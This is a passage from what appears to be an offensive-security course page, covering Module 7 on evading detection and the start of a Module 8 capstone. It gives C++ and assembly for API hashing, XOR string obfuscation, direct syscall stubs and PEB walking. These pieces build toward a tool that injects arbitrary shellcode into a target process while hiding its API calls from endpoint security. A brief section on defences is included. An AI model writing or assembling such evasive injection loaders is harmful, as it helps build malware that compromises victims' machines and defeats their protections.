+ AddressOfFunctions[ordinal];\n    //            return functionAddress;\n    // 5. Return NULL if not found\n}\n\n// Usage:\n// DWORD virtualAllocExHash = 0x????????; // Pre-calculated hash\n// LPVOID pVirtualAllocEx = CustomGetProcAddressByHash(hKernel32, virtualAllocExHash);\n</code></pre>\n<p>This simple change means the literal string &quot;VirtualAllocEx&quot; is no longer needed at runtime lookup. It significantly hinders static analysis.</p>\n<p><strong>Project Task Connection:</strong> Your Module 7 project will modify your Module 6 code to implement this hash-based lookup. You&#39;ll need to decide on a hashing algorithm and integrate it into your PE parsing logic.</p>\n<h3><strong>7.3 String Obfuscation</strong></h3>\n<p>API hashing hides the <em>function names</em> during lookup. But what about the <em>DLL names</em> (&quot;kernel32.dll&quot;, &quot;ntdll.dll&quot;)? And what about the strings representing the <em>hashes</em> themselves (if they were stored as hex strings)? And what about other potentially interesting strings in your payload (like command-and-control server addresses, file paths, mutex names)?</p>\n<p>This is where <strong>String Obfuscation</strong> comes in. The goal is to prevent static analysis tools from easily identifying strings within your executable file.</p>\n<p>Simple techniques involve encoding the strings using a key (like XOR) and decoding them at runtime just before they are used.</p>\n<h4><strong>Simple XOR Obfuscation</strong></h4>\n<p>XOR is a common choice because it&#39;s simple, reversible (XORing with the same key twice returns the original value), and fast.</p>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;vector&gt;\n#include &lt;string&gt;\n\n// Function to XOR a buffer with a single byte key\nvoid XORBuffer(char* data, size_t size, char key) {\n    for (size_t i = 0; i &lt; size; ++i) {\n        data[i] ^= key;\n    }\n}\n\n// Example of how you might use it (simplified)\n// In real code, the encoded_string would be defined directly with bytes\n// and the decoding would happen at runtime.\nint main() {\n    const char* original_string = &quot;kernel32.dll&quot;;\n    char key = 0x55; // Our XOR key\n\n    // --- Compile-time or preparation step ---\n    // In a real scenario, you&#39;d compute these encoded bytes\n    // using a separate script or build process.\n    std::vector&lt;char&gt; encoded_bytes(original_string, original_string + strlen(original_string) + 1); // +1 for null terminator\n    XORBuffer(encoded_bytes.data(), encoded_bytes.size(), key);\n\n    // To see the encoded bytes (what would go in your source code)\n    std::cout &lt;&lt; &quot;Encoded bytes (hex): &quot;;\n    for (char byte : encoded_bytes) {\n        // Print byte as unsigned hex to avoid sign issues\n        printf(&quot;%02X &quot;, static_cast&lt;unsigned char&gt;(byte));\n    }\n    std::cout &lt;&lt; std::endl;\n\n    // --- Runtime step (what your malware code would do) ---\n    // Imagine &#39;encoded_string_in_memory&#39; is the byte array from above\n    char encoded_string_in_memory[] = { /* ... your encoded bytes ... */ }; // Replace with actual encoded bytes\n    // Example using the bytes from the vector:\n    char runtime_string[100]; // Make sure buffer is large enough\n    memcpy(runtime_string, encoded_bytes.data(), encoded_bytes.size());\n\n\n    // Decode the string at runtime before use\n    XORBuffer(runtime_string, encoded_bytes.size(), key); // Decode\n\n    std::cout &lt;&lt; &quot;Decoded string: &quot; &lt;&lt; runtime_string &lt;&lt; std::endl;\n\n    // Now you can use runtime_string (e.g., pass it to LoadLibrary or your hash function)\n\n    return 0;\n}\n</code></pre>\n<p><em>(<strong>Note:</strong> In actual malware development, you wouldn&#39;t typically use <code>std::vector</code> or <code>std::string</code> in your low-level loader code, as these introduce dependencies. You would define the encoded bytes directly in a byte array <code>char encoded_dll[] = { 0xXX, 0xYY, ... };</code> and use a raw pointer and loop for decoding. The example above uses vector/string for simpler demonstration.)</em></p>\n<h4><strong>Applying String Obfuscation</strong></h4>\n<p>You would apply this to:</p>\n<ol>\n<li><strong>DLL Names:</strong> Obfuscate &quot;kernel32.dll&quot;, &quot;ntdll.dll&quot;, etc. Decode them just before calling <code>LoadLibraryA</code>/<code>LdrGetDllHandle</code> or before passing them to your custom module base finding logic (if you&#39;re not using <code>GetModuleHandle</code>).</li>\n<li><strong>API Hashes (if needed):</strong> If you store hashes as strings (e.g., &quot;0x1234ABCD&quot;), obfuscate those too. More commonly, hashes are stored directly as <code>DWORD</code> values, which don&#39;t need string obfuscation, but the <em>code</em> that calculates or uses them might still contain patterns.</li>\n<li><strong>Other Sensitive Strings:</strong> C2 URLs, file paths, registry keys, mutex names, etc.</li>\n</ol>\n<p>By combining API hashing and string obfuscation, you make it significantly harder for static analysis to determine which APIs are being called or what resources the malware interacts with. This forces analysts to rely more on dynamic analysis (running the code in a debugger or sandbox), which introduces its own challenges (like anti-analysis checks, which we&#39;ll touch on later).</p>\n<p><strong>Project Task Connection:</strong> Your Module 7 project will implement a simple string obfuscation routine (like XOR) and use it to hide at least the names &quot;kernel32.dll&quot; and &quot;ntdll.dll&quot; within your code. You&#39;ll decode them at runtime before using them with your (now hash-based) dynamic resolver.</p>\n<h3><strong>7.4 Introduction to Direct System Calls (Syscalls)</strong></h3>\n<p>This is an advanced topic, but it&#39;s essential to understand the concept as it&#39;s a prevalent evasion technique in modern malware.</p>\n<p><strong>The Problem:</strong> Even if you use dynamic API resolution and obfuscate strings, you are still eventually calling functions within user-mode DLLs like <code>ntdll.dll</code> (e.g., <code>NtAllocateVirtualMemory</code>, <code>NtCreateThreadEx</code>). Security products, especially Endpoint Detection and Response (EDR) systems, heavily rely on hooking functions in user-mode DLLs like <code>ntdll.dll</code> and <code>kernel32.dll</code> to monitor process behavior. When your code calls <code>NtAllocateVirtualMemory</code>, the EDR&#39;s hook gets executed, logs the call, inspects the arguments, and potentially blocks it.</p>\n<p><strong>The Solution: Bypassing User-Mode Hooks via Direct Syscalls.</strong></p>\n<p>Instead of calling the <code>NtAllocateVirtualMemory</code> function exported by <code>ntdll.dll</code> (which is a user-mode wrapper around the actual kernel operation), you can bypass this wrapper and execute the low-level instruction (<code>syscall</code> on x64, <code>sysenter</code> on x86) that transitions from user-mode to kernel-mode to request the operation directly.</p>\n<p>Every Native API function (<code>Nt...</code> or <code>Zw...</code>) in <code>ntdll.dll</code> has a corresponding syscall number. The function stub in <code>ntdll.dll</code> typically just loads the syscall number into a specific register (like <code>EAX</code> on x86 or <code>RAX</code> on x64) and then executes the syscall instruction.</p>\n<p>By implementing your own syscall stub (often in assembly or using compiler intrinsics), you can load the correct syscall number and execute the <code>syscall</code> instruction yourself, completely bypassing the <code>ntdll.dll</code> function&#39;s entry point where the EDR&#39;s hook might be placed.</p>\n<pre><code class=\"language-assembly\">; Example x64 Syscall Stub (Conceptual)\n; For NtAllocateVirtualMemory (Syscall number varies by OS version!)\n; rcx = ProcessHandle\n; rdx = BaseAddress\n; r8  = ZeroBits\n; r9  = RegionSize\n; [rsp+0x20] = AllocationType\n; [rsp+0x28] = Protect\n\nmov rax, &lt;syscall_number_for_NtAllocateVirtualMemory&gt; ; Load syscall number into RAX\nsyscall                                               ; Execute syscall instruction\nret                                                   ; Return to caller\n</code></pre>\n<p><em>(<strong>Note:</strong> This is highly simplified. Parameter passing conventions vary, and finding the correct syscall number dynamically is a complex task often involving parsing <code>ntdll.dll</code> at runtime, looking for specific instruction patterns (the syscall stubs), and extracting the number. Syscall numbers change between Windows versions and even builds, making hardcoding them unreliable.)</em></p>\n<h4><strong>Challenges of Direct Syscalls:</strong></h4>\n<ul>\n<li><strong>OS Version/Build Dependency:</strong> Syscall numbers are not fixed. Code that works on Windows 10 20H2 might break on Windows 11 22H2. Advanced techniques involve dynamically finding syscall numbers at runtime.</li>\n<li><strong>Implementation Complexity:</strong> Requires writing assembly or using compiler intrinsics, understanding calling conventions at the syscall boundary.</li>\n<li><strong>Detection:</strong> While you bypass user-mode hooks, the transition to kernel-mode <em>can</em> still be monitored by kernel-mode security components or hypervisor-based security. Anomalies in syscall parameters or sequences can also be detected. Security products are also getting better at detecting user-mode code that <em>looks</em> like syscall stubs.</li>\n<li><strong>Stability:</strong> Incorrectly preparing parameters or using the wrong syscall number can crash the process or the system.</li>\n</ul>\n<p><strong>Why we&#39;re only introducing it:</strong> Implementing robust, version-agnostic direct syscalls is a significant undertaking that requires deep assembly knowledge and runtime <code>ntdll.dll</code> analysis. It often warrants its own dedicated module or course. However, understanding <em>why</em> attackers use it (bypassing user-mode hooks) is crucial for understanding modern evasion and defense.</p>\n<h3><strong>7.5 Position-Independent Code (PIC)</strong></h3>\n<p>This concept is fundamental for shellcode and injected payloads, although it&#39;s not strictly an <em>evasion</em> technique itself, it&#39;s an <em>enabling</em> technique for stealthy execution in arbitrary memory locations.</p>\n<p><strong>What is PIC?</strong> Position-Independent Code is executable code that can run correctly regardless of the memory address where it is loaded. It doesn&#39;t rely on hardcoded absolute memory addresses for jumps, calls, or data access.</p>\n<p><strong>Why is it Important for Injected Code?</strong> When you allocate memory in a target process (e.g., using <code>VirtualAllocEx</code> or <code>NtAllocateVirtualMemory</code>), you don&#39;t know <em>exactly</em> where that memory block will be. It depends on the target process&#39;s existing memory layout. If your injected code (your shellcode) contains instructions like <code>call 0x12345678</code> or accesses data at <code>mov eax, [0xABCDEF00]</code>, these absolute addresses will be wrong because your code isn&#39;t loaded at its &quot;intended&quot; base address.</p>\n<p>PIC solves this by using relative addressing. Instead of <code>call 0x12345678</code>, it uses <code>call relative_offset_to_target</code>. The CPU calculates the actual target address relative to the current instruction pointer (<code>RIP</code> on x64). Data access uses similar RIP-relative addressing (<code>mov eax, [rip + relative_offset_to_data]</code>).</p>\n<p><strong>How is PIC Achieved?</strong></p>\n<ul>\n<li><strong>Compilers:</strong> Compilers can generate PIC for shared libraries (<code>.dll</code>s) using flags like <code>-fPIC</code> (GCC/Clang) or <code>/DYNAMICBASE</code> and <code>/FIXED:NO</code> (MSVC linker options, though true PIC for <code>.exe</code>-like code is harder).</li>\n<li><strong>Assembly:</strong> Writing shellcode directly in assembly allows precise control over addressing modes (using <code>CALL/POP</code> tricks on x86 or RIP-relative addressing on x64).</li>\n<li><strong>Manual Relocation:</strong> For more complex injected modules (like injecting a full DLL manually), you might implement a mini-loader that performs runtime relocation, fixing up absolute addresses based on the actual load address.</li>\n</ul>\n<p>Your shellcode payload itself (the bytes you allocate and write into the target process) <em>must</em> be PIC. This is why simple C/C++ functions compiled normally are often not suitable directly as shellcode; they contain absolute references that will break. You need to compile them specifically for PIC or write them in assembly.</p>\n<h3><strong>7.6 Simple Code Obfuscation and Anti-Analysis Tricks</strong></h3>\n<p>Beyond hiding API calls and strings, attackers use various techniques to make the code itself harder to reverse engineer and analyze dynamically.</p>\n<ul>\n<li><strong>Junk Code:</strong> Inserting instructions that do nothing functionally but alter the code&#39;s appearance, confusing disassemblers and analysts.</li>\n<li><strong>Control Flow Obfuscation:</strong> Replacing simple <code>if/else</code> or loops with convoluted sequences of jumps, indirect calls, or state-machine-like logic.</li>\n<li><strong>Stack Strings:</strong> Constructing strings on the stack byte by byte at runtime instead of having them in the data section.</li>\n<li><strong>Encoding/Encryption:</strong> Encrypting the main payload and only decrypting it in memory just before execution. The decryption key might be derived at runtime based on environmental factors.</li>\n<li><strong>Simple Anti-Debugging Checks:</strong><ul>\n<li><code>IsDebuggerPresent()</code>: A simple WinAPI call. Easily bypassed but catches the laziest attempts.</li>\n<li>Checking the PEB (<code>Process Environment Block</code>): The <code>BeingDebugged</code> flag is stored here. Accessing the PEB requires understanding OS structures (tying back to Module 1 and <code>zhasslan.txt</code> concepts).</li>\n<li>Timing Checks: Measuring the time between two points. If it takes too long (due to debugger breakpoints or single-stepping), the code might detect analysis.</li>\n<li>Looking for debugger windows or processes.</li>\n</ul>\n</li>\n</ul>\n<p>These techniques add layers of complexity. An analyst hitting obfuscated code or an anti-debugging check has to spend time understanding and bypassing it, slowing down the analysis process.</p>\n<h3><strong>7.7 Case Study Snippet: Emotet/TrickBot Evasion</strong></h3>\n<p>Malware families like Emotet and TrickBot (and their loaders) are notorious for their sophisticated evasion techniques. They frequently employ:</p>\n<ol>\n<li><strong>Heavy API Hashing:</strong> Almost all Windows API calls are resolved via hashing, making static analysis of their imports useless.</li>\n<li><strong>Extensive String Obfuscation:</strong> Configuration data, C2 URLs, injected DLL names, mutex names – all are heavily obfuscated, often with multi-layered schemes (XOR, RC4, custom algorithms).</li>\n<li><strong>Dynamic Syscall Resolution:</strong> Newer variants often incorporate techniques to find and use syscalls directly to evade EDR hooks.</li>\n<li><strong>Packed/Encoded Payloads:</strong> The core malicious payload is often encrypted or encoded, only being decrypted in memory by a small, highly obfuscated loader stub.</li>\n<li><strong>Anti-Analysis Checks:</strong> They often include checks for debuggers, sandboxes, and analysis tools.</li>\n</ol>\n<p>These families demonstrate the practical application of the techniques we&#39;re discussing. Their loaders are prime examples of the principles from <code>zhasslan.txt</code> – minimizing the static footprint, obscuring control flow, and dynamically resolving everything possible. Analyzing samples from these families (in a safe, isolated environment!) is an excellent way to see these techniques in action.</p>\n<h3><strong>7.8 Defensive Considerations (Briefly)</strong></h3>\n<p>How do defenders counter these techniques?</p>\n<ul>\n<li><strong>Emulation/Execution:</strong> Security products run the initial code in a safe environment (emulator, sandbox) to trigger the decoding and hashing routines and reveal the actual API calls and strings.</li>\n<li><strong>Behavioral Analysis:</strong> Even if API calls are obfuscated, the <em>behavior</em> (allocating executable memory, writing code, creating remote threads/APCs) is often detectable.</li>\n<li><strong>Memory Scanning:</strong> Scanning process memory for known shellcode patterns or decoded strings after the payload has been unpacked/decoded.</li>\n<li><strong>Hooking Deeper:</strong> Attempting to hook syscalls in the kernel (more difficult and risky) or monitoring the syscall instruction itself.</li>\n<li><strong>Heuristics:</strong> Detecting code patterns common in obfuscated code or custom syscall stubs.</li>\n<li><strong>Threat Intelligence:</strong> Sharing hashes of obfuscation routines or specific code patterns observed in the wild.</li>\n</ul>\n<p>It&#39;s a constant arms race! Attackers develop new evasion, defenders develop new detection, and so on. Understanding both sides is key.</p>\n<h3><strong>7.9 Module Project/Exercise: Enhancing Your Resolver with Hashing and Obfuscation</strong></h3>\n<p>Alright, let&#39;s put this into practice. Your task is to take the dynamic API resolver you built in Module 6 and make it stealthier.</p>\n<p><strong>Goal:</strong> Modify your custom <code>GetProcAddress</code>-like function to use API hashing instead of string comparison, and implement string obfuscation for the DLL names.</p>\n<p><strong>Steps:</strong></p>\n<ol>\n<li><strong>Review Module 6 Code:</strong> Get your working code that manually parses the PE Export Directory to find a function address by name.</li>\n<li><strong>Implement a Hashing Algorithm:</strong> Choose either the ROR13 example provided or another simple, fast hash function. Implement this as a C++ function, e.g., <code>DWORD CalculateAPIHash(const char* apiName)</code>.</li>\n<li><strong>Modify Your Resolver Function:</strong><ul>\n<li>Change the function signature of your custom <code>GetProcAddress</code> to accept a <code>DWORD</code> hash value instead of a <code>const char*</code> function name. Let&#39;s call it `LPVOID GetProcAddressByHash(</li>\n</ul>\n</li>\n</ol>\n\n                </div>\n             </div>\n         ",
    "module-8": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 8: module_8</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, welcome to the culmination of our journey! Module 8 is where we take all the powerful, low-level knowledge we&#39;ve acquired over the past seven modules – understanding Windows internals, mastering different execution contexts (APCs, Native Threads, Fibers), dissecting the PE format, and building dynamic API resolution with evasion – and synthesize it into a single, functional, stealthy tool.</p>\n<p>This isn&#39;t just an exercise; it&#39;s about building a core capability. The concepts here form the backbone of many advanced offensive tools and sophisticated malware loaders. We&#39;re moving from understanding individual components to constructing a system.</p>\n<p>Let&#39;s get building!</p>\n<hr>\n<h2><strong>Module 8: Capstone Project - Building Your Advanced Execution Framework</strong></h2>\n<p><strong>Module Objective:</strong> Integrate the advanced techniques learned throughout the course into a single, functional tool capable of executing arbitrary shellcode in a target process using multiple stealthy and resilient methods, demonstrating mastery of the course material.</p>\n<p><strong>Time Allotment:</strong> This module will likely take the most time, potentially spanning several sessions or a significant portion of your dedicated lab time. It&#39;s a building phase.</p>\n<hr>\n<h3><strong>8.1 Introduction: Synthesizing Knowledge into Capability</strong></h3>\n<p>We&#39;ve spent the last seven modules digging into the nitty-gritty:</p>\n<ul>\n<li>Module 1: Process/Thread/Memory deep dive.</li>\n<li>Module 2: APC Injection mechanics (<code>NtQueueApcThread</code>).</li>\n<li>Module 3: Native API power (<code>NtCreateThreadEx</code>, <code>NtAllocateVirtualMemory</code>).</li>\n<li>Module 4: Fibers and Context Manipulation (<code>SwitchToFiber</code>, <code>SetThreadContext</code>).</li>\n<li>Module 5: Unconventional paths (Window Messages, Callbacks).</li>\n<li>Module 6: Dynamic API Resolution (PE Parsing, EAT traversal).</li>\n<li>Module 7: Advanced Evasion (API Hashing, String Obfuscation).</li>\n</ul>\n<p>Now, it&#39;s time to combine these. Our goal is to create a tool that can:</p>\n<ol>\n<li>Take a target Process ID (PID) and a raw shellcode file as input.</li>\n<li>Allow the user to select an injection method (at least two from APC, Native Thread (<code>NtCreateThreadEx</code>), or potentially Fiber/Context manipulation if you got the stretch goals working).</li>\n<li>Read the shellcode from the file.</li>\n<li>Perform the injection into the target process.</li>\n<li><strong>CRITICALLY:</strong> Perform <em>all</em> necessary Windows/Native API calls (<code>OpenProcess</code>, memory allocation, writing, thread/APC creation, handle closing, etc.) using the <strong>dynamic API resolution framework</strong> you built in Modules 6 &amp; 7 (including hashing/obfuscation where applicable). No static imports beyond the absolute minimum startup code (like reading command line args, though even that could be avoided with more advanced techniques we won&#39;t cover here).</li>\n<li>Be reasonably robust and include basic error handling.</li>\n</ol>\n<p>Think of this as building your own mini-Metasploit <code>inject</code> payload handler, but with a focus on the stealthy, low-level mechanics we&#39;ve explored.</p>\n<h3><strong>8.2 Recap of Core Requirements for the Capstone Tool</strong></h3>\n<p>Let&#39;s be crystal clear about what your final tool needs to demonstrate:</p>\n<ul>\n<li><strong>Input:</strong> Target PID (integer), Shellcode file path (string), Injection method choice (e.g., command-line flag <code>--method apc</code> or <code>--method native</code>).</li>\n<li><strong>Core Functionality:</strong> Read shellcode, inject into target process, execute shellcode.</li>\n<li><strong>Injection Methods:</strong> Implement <em>at least two</em> distinct methods covered in the course (e.g., APC via <code>NtQueueApcThread</code>, Native Thread via <code>NtCreateThreadEx</code>).</li>\n<li><strong>API Resolution:</strong> <strong>All</strong> Windows API and Native API functions required for the injection process <em>must</em> be resolved dynamically at runtime.<ul>\n<li>This includes: <code>OpenProcess</code>, memory allocation (<code>VirtualAllocEx</code> or <code>NtAllocateVirtualMemory</code>), memory writing (<code>WriteProcessMemory</code> or <code>NtWriteVirtualMemory</code>), thread/APC creation (<code>CreateRemoteThreadEx</code> or <code>NtCreateThreadEx</code> or <code>QueueUserAPC</code> or <code>NtQueueApcThread</code>), handle closing (<code>CloseHandle</code> or <code>NtClose</code>), error checking functions (<code>GetLastError</code> or <code>NtStatus</code> checks).</li>\n<li>This dynamic resolution must leverage your PE parsing and EAT traversal logic from Module 6.</li>\n<li>Ideally, this resolution should use the API hashing logic from Module 7 to avoid cleartext function names.</li>\n<li><em>Advanced Challenge:</em> Even <code>LoadLibraryA</code>/<code>GetProcAddress</code> (or their Native equivalents) should be resolved dynamically, typically by manually parsing the Process Environment Block (PEB) to find the base addresses of <code>kernel32.dll</code> and <code>ntdll.dll</code>. This avoids <em>any</em> static import beyond the very initial program entry point. (We&#39;ll provide guidance on the PEB approach).</li>\n</ul>\n</li>\n<li><strong>Evasion:</strong> Integrate API hashing and potentially string obfuscation (Module 7) for DLL/function names used in the dynamic resolution process itself.</li>\n<li><strong>Environment:</strong> Build and test in your isolated lab environment (VM!).</li>\n</ul>\n<h3><strong>8.3 Architectural Design and Planning</strong></h3>\n<p>Before we write code, let&#39;s plan the structure. A simple command-line tool structure works well:</p>\n<pre><code>[main function]\n    -&gt; Parse command line arguments (PID, shellcode file, method)\n    -&gt; Read shellcode from file\n    -&gt; [Setup Dynamic API Resolver]\n        -&gt; Initialize resolver (e.g., parse PEB to find kernel32/ntdll base addresses)\n        -&gt; Resolve ALL necessary API function pointers using hashes/names\n        -&gt; Store resolved pointers (e.g., in a struct or global variables)\n    -&gt; [Open Target Process]\n        -&gt; Use resolved `OpenProcess` (or `NtOpenProcess`)\n        -&gt; Handle errors (e.g., permissions)\n    -&gt; [Select and Execute Injection Method]\n        -&gt; Based on user input (method flag):\n            -&gt; Call `ExecuteInjectionAPC(...)` function\n            -&gt; Call `ExecuteInjectionNativeThread(...)` function\n            // -&gt; Call `ExecuteInjectionFiber(...)` etc.\n    -&gt; [Cleanup]\n        -&gt; Use resolved `CloseHandle` (or `NtClose`) for process handle\n    -&gt; Report success/failure\n</code></pre>\n<p><strong>Key Design Considerations:</strong></p>\n<ol>\n<li><p><strong>Dynamic Resolver Implementation:</strong> How will you make your Module 6/7 code easily callable?</p>\n<ul>\n<li>Option A: A class <code>DynamicResolver</code> with a method like <code>GetProcAddressByHash(moduleHash, functionHash)</code>.</li>\n<li>Option B: A set of global function pointers that are populated by an <code>InitializeResolver()</code> function at the start of <code>main</code>. This is often simpler for small tools.</li>\n<li><em>PEB Parsing:</em> To avoid even <code>GetModuleHandleA</code>/<code>LoadLibraryA</code> as static imports or initial dynamic calls, you&#39;ll need to find module base addresses by walking the PEB. This is a common technique in shellcode and advanced loaders because the PEB&#39;s address is easily accessible (<code>FS</code> segment register on x86, <code>GS</code> on x64). We&#39;ll outline this.</li>\n</ul>\n</li>\n<li><p><strong>Storing Resolved Pointers:</strong> A <code>struct</code> is a clean way to hold all your resolved API function pointers:</p>\n<pre><code class=\"language-c++\">// Example struct to hold resolved function pointers\ntypedef struct _RESOLVED_APIS {\n    // kernel32.dll / WinAPI functions\n    FARPROC pOpenProcess;\n    FARPROC pVirtualAllocEx;\n    FARPROC pWriteProcessMemory;\n    FARPROC pCloseHandle;\n    FARPROC pGetLastError; // Or NtStatus checks if using Native\n\n    // ntdll.dll / Native API functions\n    FARPROC pNtOpenProcess; // Alternative to OpenProcess\n    FARPROC pNtAllocateVirtualMemory; // Alternative to VirtualAllocEx\n    FARPROC pNtWriteVirtualMemory; // Alternative to WriteProcessMemory\n    FARPROC pNtCreateThreadEx; // Alternative to CreateRemoteThreadEx\n    FARPROC pNtQueueApcThread; // For APC injection\n    FARPROC pNtClose; // Alternative to CloseHandle\n    FARPROC pNtGetNextThread; // For finding threads for APCs (less common, often iterate Snapshots instead)\n    // ... add others as needed\n} RESOLVED_APIS, *PRESOLVED_APIS;\n\nRESOLVED_APIS g_ResolvedAPIs; // Global instance\n</code></pre>\n</li>\n<li><p><strong>Error Handling:</strong> Since you&#39;re using low-level APIs and working across process boundaries, errors are frequent. Check return values of <em>every</em> API call. Use <code>GetLastError()</code> (resolved dynamically, of course!) or check <code>NTSTATUS</code> values and print informative messages.</p>\n</li>\n<li><p><strong>Shellcode Format:</strong> Keep it simple: a raw binary file containing the shellcode bytes. Read it into a <code>char*</code> or <code>BYTE*</code> buffer.</p>\n</li>\n</ol>\n<h3><strong>8.4 Step-by-Step Implementation Guide</strong></h3>\n<p>Let&#39;s break down the coding process.</p>\n<p><strong>Step 1: Project Setup and Boilerplate</strong></p>\n<ul>\n<li>Create a new C++ console project in your IDE (Visual Studio, or use GCC/Clang with MinGW/Cygwin).</li>\n<li>Include necessary headers. Since we&#39;re avoiding static imports, you might only need <code>&lt;windows.h&gt;</code> (for basic types like <code>HANDLE</code>, <code>DWORD</code>, <code>LPVOID</code>), <code>&lt;iostream&gt;</code> (for console output), <code>&lt;vector&gt;</code> (for shellcode buffer), <code>&lt;fstream&gt;</code> (for reading shellcode), <code>&lt;string&gt;</code>, <code>&lt;tchar.h&gt;</code> (if dealing with TCHARs, though byte strings are often simpler for low-level work), <code>&lt;winternl.h&gt;</code> (for <code>NTSTATUS</code>, <code>PPEB</code>, etc. - these structures/enums are often needed even if the functions are resolved dynamically).</li>\n<li>Add your hashing function code (Module 7).</li>\n<li>Add your PE parsing/EAT traversal code (Module 6).</li>\n<li>Define the <code>RESOLVED_APIS</code> struct.</li>\n</ul>\n<p><strong>Step 2: Implementing PEB Parsing for Initial Module Base Addresses</strong></p>\n<p>To achieve full dynamic resolution without relying on <code>GetModuleHandleA</code> or <code>LoadLibraryA</code> initially, we&#39;ll find the base addresses of <code>kernel32.dll</code> and <code>ntdll.dll</code> by walking the Process Environment Block (PEB). This requires a bit of low-level pointer magic and understanding the PEB structure.</p>\n<ul>\n<li><p>The PEB is pointed to by the <code>FS</code> register on x86 and <code>GS</code> on x64.</p>\n</li>\n<li><p>The PEB contains a pointer to the <code>PEB_LDR_DATA</code> structure, which in turn contains linked lists of loaded modules.</p>\n</li>\n<li><p>We can iterate these lists to find the modules we need (<code>ntdll.dll</code> and <code>kernel32.dll</code>) by comparing their names.</p>\n</li>\n<li><p><strong>Code Snippet (Conceptual - x64):</strong></p>\n<pre><code class=\"language-c++\">#include &lt;windows.h&gt;\n#include &lt;winternl.h&gt; // For PEB structures\n#include &lt;string&gt;\n#include &lt;vector&gt;\n\n// Define necessary types if winternl.h isn&#39;t sufficient or for clarity\n// For x64:\ntypedef struct _PEB_LDR_DATA_X64 {\n    DWORD       Reserved1[2];\n    PVOID       Reserved2[3];\n    LIST_ENTRY  InMemoryOrderModuleList;\n    // ... rest of structure\n} PEB_LDR_DATA_X64, *PPEB_LDR_DATA_X64;\n\ntypedef struct _LDR_DATA_TABLE_ENTRY_X64 {\n    LIST_ENTRY InLoadOrderLinks;\n    LIST_ENTRY InMemoryOrderLinks;\n    LIST_ENTRY InInitializationOrderLinks;\n    PVOID DllBase; // THIS is the base address we need!\n    PVOID EntryPoint;\n    ULONG SizeOfImage;\n    UNICODE_STRING FullDllName;\n    UNICODE_STRING BaseDllName; // THIS is the name we compare!\n    ULONG Flags;\n    USHORT LoadCount;\n    USHORT TlsIndex;\n    LIST_ENTRY HashLinks;\n    PVOID SectionPointer;\n    ULONG CheckSum;\n    ULONG TimeDateStamp;\n    PVOID LoadedImports;\n    PVOID EntryPointActivationContext;\n    PVOID PatchInformation;\n    LIST_ENTRY ForwarderLinks;\n    LIST_ENTRY ServiceTagLinks;\n    LIST_ENTRY StaticImportLinks;\n} LDR_DATA_TABLE_ENTRY_X64, *PLDR_DATA_TABLE_ENTRY_X64;\n\n// Function to get module base address via PEB parsing\n// Requires Module 6/7 PE parsing logic\n// Needs to handle UNICODE_STRING comparison\nHMODULE GetModuleBaseFromPEB(const std::wstring&amp; moduleName) {\n    // Get PEB address (x64 specific - uses GS register)\n    PPEB pPeb = (PPEB)__readgsqword(0x60); // 0x60 is the offset for PEB on x64\n\n    // Get LDR_DATA_TABLE_ENTRY list\n    PPEB_LDR_DATA pLdr = pPeb-&gt;Ldr; // For x64, use the direct field\n\n    // Walk the InLoadOrderModuleList (or InMemoryOrderModuleList)\n    // Note: The structure offsets and list names can vary slightly by OS version/architecture\n    // InMemoryOrderModuleList is often preferred as it&#39;s consistent\n    PLIST_ENTRY pListHead = &amp;pLdr-&gt;InMemoryOrderModuleList;\n    PLIST_ENTRY pListEntry = pListHead-&gt;Flink;\n\n    // The first entry is the executable, the second is ntdll, third is kernel32 usually,\n    // but iterating and comparing names is safer.\n    while (pListEntry != pListHead) {\n        // Calculate address of the LDR_DATA_TABLE_ENTRY from the LIST_ENTRY\n        // This offset is specific to the structure definition\n        // For x64, InMemoryOrderLinks is usually at offset 0x10 within LDR_DATA_TABLE_ENTRY_X64\n        PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pListEntry - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));\n\n        // Compare BaseDllName (UNICODE_STRING) with the target module name\n        // Need a helper to convert UNICODE_STRING to wstring/string for comparison\n        std::wstring currentModuleName(pEntry-&gt;BaseDllName.Buffer, pEntry-&gt;BaseDllName.Length / sizeof(WCHAR));\n\n        if (_wcsicmp(currentModuleName.c_str(), moduleName.c_str()) == 0) {\n            return (HMODULE)pEntry-&gt;DllBase; // Found it!\n        }\n\n        pListEntry = pListEntry-&gt;Flink; // Move to the next entry\n    }\n\n    return nullptr; // Not found\n}\n\n// Need a function to convert UNICODE_STRING to std::wstring for comparison\n// (Implementation omitted for brevity, but involves WideCharToMultiByte or similar)\n// Need to handle x86 PEB parsing (__readfsdword(0x30) for PEB pointer)\n</code></pre>\n</li>\n<li><p><strong>Important:</strong> PEB structure offsets and the list names/order can vary between Windows versions and architectures (x86 vs x64). The code above is a conceptual x64 example. You&#39;ll need to adapt it or find architecture-specific definitions. This is where relying on resources like <code>winternl.h</code> and careful debugging/analysis comes in.</p>\n</li>\n</ul>\n<p><strong>Step 3: Implementing the Full Dynamic Resolver Initialization</strong></p>\n<p>Combine the PEB parsing with your EAT traversal from Module 6/7.</p>\n<ul>\n<li><p>Create a function, e.g., <code>InitializeResolvedAPIs(PRESOLVED_APIS pApiStruct)</code>.</p>\n</li>\n<li><p>Inside this function:</p>\n<ul>\n<li>Call <code>GetModuleBaseFromPEB</code> to get the base address of <code>ntdll.dll</code>.</li>\n<li>Call <code>GetModuleBaseFromPEB</code> to get the base address of <code>kernel32.dll</code>.</li>\n<li>For each required API function listed in your <code>RESOLVED_APIS</code> struct:<ul>\n<li>Get the module base address (<code>ntdll_base</code> or <code>kernel32_base</code>).</li>\n<li>Calculate the hash of the function name string (using your Module 7 hash function).</li>\n<li>Call your Module 6/7 EAT parsing function (adapted to take base address and hash) to get the function pointer.</li>\n<li>Store the resulting pointer in the <code>pApiStruct</code>.</li>\n<li>Include robust error checking: If any required function fails to resolve, the initialization should fail, and the program should exit gracefully.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Code Snippet (Conceptual):</strong></p>\n<pre><code class=\"language-c++\">#include &quot;YourDynamicResolverCode.h&quot; // Include your Module 6/7 code\n#include &quot;YourHashingCode.h&quot;        // Include your Module 7 code\n\n// Global struct instance\nRESOLVED_APIS g_ResolvedAPIs = { 0 }; // Initialize to null\n\nBOOL InitializeResolvedAPIs() {\n    // Step 1: Get module bases via PEB\n    HMODULE 